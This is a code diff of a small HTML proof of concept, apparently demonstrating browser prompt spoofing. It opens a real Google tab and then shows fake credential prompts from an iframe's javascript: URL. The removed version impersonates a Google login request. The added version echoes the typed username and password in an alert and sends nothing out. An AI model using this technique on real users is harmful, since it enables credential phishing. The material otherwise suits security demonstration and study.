@@ -1,16 +1,17 @@
-
 <!DOCTYPE html>
 <html>
   <body>
     <script>
       function exploit() {
-        // Opens legitimate-looking Google tab
+        // Membuka tab Google asli
         window.open("https://www.google.com");
 
         // Delay 2 detik sebelum menampilkan prompt palsu
         setTimeout(function () {
           document.getElementById("iframe").src =
-            'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+            "javascript:let username = prompt('Enter your username');" +
+            "let password = prompt('Enter your password');" +
+            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
         }, 2000); // 2000 ms = 2 detik
       }
     </script>
